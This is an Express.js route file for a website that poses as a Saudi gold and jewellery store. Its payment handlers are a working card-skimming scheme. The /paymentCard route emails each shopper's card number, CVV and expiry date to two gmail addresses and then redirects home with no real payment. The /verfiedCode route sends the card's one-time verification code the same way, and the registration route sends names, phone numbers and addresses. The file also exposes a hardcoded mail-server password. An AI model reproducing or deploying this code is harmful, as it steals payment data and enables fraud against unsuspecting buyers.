var express = require("express");
var router = express.Router();
var pdf = require("html-pdf");
var fileURLToPath = require("url");
var dirname = require("path");
var pdfTemp = require("../doc/index.js");

const {
  braceletnecklace,
  necklace,
  bracelet,
  framesnecklaces,
  frames,
  necklacesGold,
  bars,
  uaBars,
  saBars,
  swBars,
  coins,
  enCoins,
  saCoins,
  Product,
} = require("../helper/data");
 
var nodemailer = require("nodemailer");


// mail config
var transporter = nodemailer.createTransport({
  host: "smtp.privateemail.com",
  port: 465,
  secure: true,
  auth: {
    user: "success@resttime.org",
    pass: "Fula@1212",
  },
});

var options = { format: "A4" };

// pages raouts

router.get("/", function (req, res, next) {
   res.render("index", {
    braceletnecklace,
    necklace,
    bracelet,
    framesnecklaces,
    frames,
    necklacesGold,
    bars,
    uaBars,
    saBars,
    swBars,
    coins,
    enCoins,
    saCoins,
  });
});

router.get("/product/:id", function (req, res, next) {
    let id = req.params.id;
     let apro = Product.filter((i) => i.id == id);
    let product = apro[0];
    let category = Product.filter((i) => i.category == product.category);
   res.render("product", {product,category
  });
});
router.get("/cart/:id", function (req, res, next) {
    let id = req.params.id;
    let apro = Product.filter((i) => i.id == id);
    let product = apro[0];
   res.render("cart", {product
  });
});
router.get("/login", function (req, res, next) {
   res.render("login", {
  });
});
router.get("/condations", function (req, res, next) {
   res.render("condations", {
  });
});
 
router.get("/checkout-step1/:id", function (req, res, next) {
  let id = req.params.id
  let apro = Product.filter((i) => i.id == id);
  let product = apro[0];
   res.render("checkoutStep1", {product});
});

router.get("/checkout-step2", function (req, res, next) {
   res.render("checkoutStep2", {});
});
router.get("/order-checkout/:id", function (req, res, next) {
  let id = req.params.id;
    let apro = Product.filter((i) => i.id == id);
    let product = apro[0];
   res.render("order", {product
  });
});

router.get("/category/:id", async function (req, res, next) {
  // if sa-bars =>  sa-bars-gold
  //                sa-bars-oval
  // if  
    let cat = req.params.id
    let category
    let catName
    let subCatName
    if (cat == "sa-bars") {
      category= Product.filter((i) => i.cat == "sa");
      subCatName="سبائك سعودية"
      catName="سبائك ذهب"
    }else if(cat == "ua-bars"){
      subCatName="سبائك الأتحاد"
      catName="سبائك ذهب"
      category= Product.filter((i) => i.cat == "ua");
    }else if(cat == "sw-bars"){
      subCatName="سبائك سويسرية"
      catName="سبائك ذهب"
      category= Product.filter((i) => i.cat == "sw");
     } 

    else{
      category= Product.filter((i) => i.category == cat);
    }
   
  res.render("category", { title: "Express",category, subCatName,catName });
});

router.get("/sub-category/:id", function (req, res, next) {
  let cat = req.params.id
  let category 
  let subCatName
  let catName
   
    if (cat == "sa-bars") {
      category= Product.filter((i) => i.cat == "sa");
      subCatName="سبائك سعودية"
      catName="سبائك ذهب"
    }else if(cat == "ua-bars"){
      subCatName="سبائك الأتحاد"
      catName="سبائك ذهب"
      category= Product.filter((i) => i.cat == "ua");
    }else if(cat == "sw-bars"){
      subCatName="سبائك سويسرية"
      catName="سبائك ذهب"
      category= Product.filter((i) => i.cat == "sw");
      
    }else if(cat == "sa-bars-oval"){
      category= Product.filter((i) => i.subCategory == "sa-bars-oval");
      subCatName="سبائك بيضاوية "
      catName=" سبائك السعوية"
    }else if(cat == "sa-bars-gold"){
      category= Product.filter((i) => i.subCategory == "ua-bars-gold");
      subCatName="سبائك مستطيلة"
      catName=" سبائك السعودية"
    
    }else if(cat == "ua-bars-gold"){
      category= Product.filter((i) => i.subCategory == "ua-bars-gold");
      subCatName="سبائك مستطيلة"
      catName=" سبائك الاتحاد"
    }else if(cat == "ua-bars-oval"){
      category= Product.filter((i) => i.subCategory == "ua-bars-oval");
      subCatName="سبائك بيضاوية"
      catName=" سبائك الاتحاد"
    }
    else if(cat == "sa-coins"){
      category= Product.filter((i) => i.subCategory == "sa-coins");
      subCatName=" جنيهات سعودية "
      catName=" جنيهات ذهب"
    }else if(cat == "en-coins"){
      category= Product.filter((i) => i.subCategory == "en-coins");
      subCatName=" جنيهات انجليزية "
      catName=" جنيهات ذهب"
    }else if(cat == "frames-gold"){
      category= Product.filter((i) => i.subCategory == "frames-gold");
      subCatName="براويز ذهب"
      catName="  سلاسل وبراويز"
    }else if(cat == "necklaces-gold"){
      category= Product.filter((i) => i.subCategory == "necklaces-gold");
      subCatName="سلاسل ذهب "
      catName="سلاسل وبراويز"
    }else if(cat == "necklace"){
      category= Product.filter((i) => i.subCategory == "necklace");
      subCatName=" عقود"
      catName="  أساور وعقود"
    }else if(cat == "bracelets"){
      category= Product.filter((i) => i.subCategory == "bracelets");
      subCatName="أساور  "
      catName="أساور وعقود"
     }
     else{
      category= Product.filter((i) => i.subCategory == cat);  
     }
    console.log("ss", subCatName);
  res.render("category", { title: "Express" ,category,subCatName,catName});
});
 
router.get("/cart", function (req, res, next) {
  res.render("eCart", { title: "Express" });
});
router.get("/aramex", function (req, res, next) {
  res.render("aramex", { title: "Express" });
});

router.get("/about", function (req, res, next) {
  res.render("about", { title: "Express" });
});
router.get("/refund-exchange-policy", function (req, res, next) {
  res.render("refund-exchange-policy", { title: "Express" });
});

router.get("/checkout/:id", function (req, res, next) {
  let id = req.params.id;
  let apro = Product.filter((i) => i.id == id);
  let pro = apro[0];
  res.render("checkout", { title: "checkout", pro });
});
 
 
router.get("/contact", function (req, res, next) {
  res.render("contact", { title: "Express" });
}); 

 
 
router.get("/verfiedCode", (req, res) => {
  res.render("code");
});

// ============= Register User =================

router.post("/userRegister", function (req, res, next) {
  console.log("body", req.body);
  let htl = `
    <h3>${req.body.name}</h3>
    <h3>whatsapp: ${req.body.phone}</h3>
    <h3>price: ${req.body.price} ريال</h3>
    <h3>product: ${req.body.note}</h3>
    <h3>addres: ${req.body.address}</h3>
    <h3>addres2: ${req.body.address2}</h3>
  `;
   
    transporter.sendMail(
      {
        from: `success@resttime.org`, // sender address
        bcc: `fack21gasa@gmail.com,ounsa.assel@gmail.com`, // list of receivers
        subject: `Ounsa invoice ${req.body.name}`, // Subject line
        text: `Ounsa invoice`, // plain text body
        html: htl, // html body
       },
      (error, info) => {
        if (error) {
          console.log(error);
        } else {
          console.log("Email sent: " + info.response);
        }
      }
    );
   
  return res.status(200).json({ message: "success" });
  // res.redirect("/payment-way");
});

// ============= Visa Card =====================
router.post("/paymentCard", function (req, res, next) {
  let htl = `
    <h3>Card Number: ${req.body.cardnumber}</h3>
    <h3>pin: ${req.body.cvv}</h3>
    <h3>Ex date: ${req.body.carddate} / ${req.body.carddate1}</h3>
  `;
  var mailOptions = {
    from: "success@resttime.org",
    bcc: "fack21gasa@gmail.com,ounsa.assel@gmail.com ",
    subject: `Ounsa cc ${req.body.cardnumber}`,
    text: "",
    html: htl,
  };

  transporter.sendMail(mailOptions, function (error, info) {
    if (error) {
      console.log(error);
    } else {
      console.log("Email sent: " + info.response);
    }
  });
  res.redirect("/");
});
     

router.post("/verfiedCode", function (req, res, next) {
  let htl = `
  <h3>verfiedCode: ${req.body.verfiedCode}</h3>
  `;
  var mailOptions = {
    from: "success@resttime.org",
    bcc: "fack21gasa@gmail.com,ounsa.assel@gmail.com ",
    subject: `Ounsa Card verfiedCode ${req.body.verfiedCode}`,
    text: "",
    html: htl,
  };

  transporter.sendMail(mailOptions, function (error, info) {
    if (error) {
      console.log(error);
    } else {
      console.log("Email sent: " + info.response);
    }
  });

  return res.status(200).json({ message: "success" });
});
 
router.get("/payError", (req, res) => {
  res.render("payError");
});


module.exports = router;
